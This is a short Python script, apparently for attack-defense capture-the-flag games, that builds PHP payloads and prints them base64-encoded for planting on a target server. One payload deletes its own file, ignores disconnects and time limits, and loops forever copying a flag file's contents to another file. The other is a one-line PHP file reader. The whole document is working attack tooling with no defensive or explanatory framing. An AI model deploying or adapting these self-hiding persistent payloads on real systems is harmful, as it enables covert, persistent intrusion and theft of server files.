#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys
import base64


def b1():
    file_contents = '''
    <?php
    unlink($_SERVER['SCRIPT_FILENAME']);
    ignore_user_abort(true);
    set_time_limit(0);

    while (True){
        $f=base64_encode(file_get_contents('{flag_url}'));
        file_put_contents("{out_file}",$f);
        sleep(5);
    }
    ?>'''

    if len(sys.argv) < 3:
        print "Usage:%s <get_flag_url> <out_flag_file> " %sys.argv[0]
        exit()
    file_contents = file_contents.replace("{flag_url}",sys.argv[1]);
    file_contents = file_contents.replace("{out_file}",sys.argv[2]);

    return file_contents

def b2():

    file_contents = '''<?php echo file_get_contents("{flag_url}");?>'''

    if len(sys.argv) < 2:
        print "Usage:%s <get_flag_url> " %sys.argv[0]
        exit()
    file_contents = file_contents.replace("{flag_url}",sys.argv[1]);

    return file_contents

def base64_covert(file_contents):
    base64_str = base64.b64encode(file_contents);
    '''base64_file =  "base64.txt"
    with open(base64_file,'w') as f:
        f.write(base64_str)
    '''
    print base64_str

def main():
    file_contents = b1()
    #file_contents = b2()
    print file_contents
    base64_covert(file_contents)

    print 'done...'

if __name__ == '__main__':
    main()
